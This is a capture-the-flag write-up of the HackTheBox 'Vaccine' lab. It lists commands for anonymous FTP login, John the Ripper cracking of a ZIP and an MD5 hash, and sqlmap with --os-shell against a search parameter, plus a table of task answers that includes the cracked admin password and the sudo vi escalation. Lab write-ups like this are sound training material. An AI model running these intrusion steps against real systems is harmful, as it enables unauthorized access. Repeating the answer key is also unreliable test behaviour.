TITLE: Vaccine
CATEGORY: HackTheBox
DATE: 2026-05-08
IMAGE: ./assets/Vaccine.png
---
# Vaccine

This box followed a familiar path: anonymous FTP access, archive cracking, password reuse, and then a vulnerable search parameter on the web app.

## Notes

The first useful step was an anonymous FTP login that exposed a ZIP archive. After cracking that archive, I found another hash in the extracted files and cracked that one too.

```bash
ftp anonymous@10.129.143.66 -P 21
john --wordlist=/usr/share/wordlists/rockyou.txt --format=pkzip hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 newhash.txt
```

I then tested the search parameter and confirmed the input was injectable. The noisy terminal output is left out here so the post stays easy to read.

```bash
sqlmap -u "http://10.129.143.66/dashboard.php?search=hi" --cookie="PHPSESSID=iehjg6itg0g3tuqtmkda4r0van" --os-shell
```


## Tasks

| Task | Question | Answer |
| :--- | :--- | :--- |
| 1 | Besides SSH and HTTP, what other service is hosted on this box? | `FTP` |
| 2 | This service can be configured to allow login with any password for specific username. What is that username? | `anonymous` |
| 3 | What is the name of the file downloaded over this service? | `backup.zip` |
| 4 | What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? | `zip2john` |
| 5 | What is the password for the admin user on the website? | `qwerty789` |
| 6 | What option can be passed to sqlmap to try to get command execution via the sql injection? | `--os-shell` |
| 7 | Submit user flag | `User flag owned` |
| 8 | What program can the postgres user run as root using sudo? | `vi` |
| 9 | Submit root flag | `Root flag owned` |
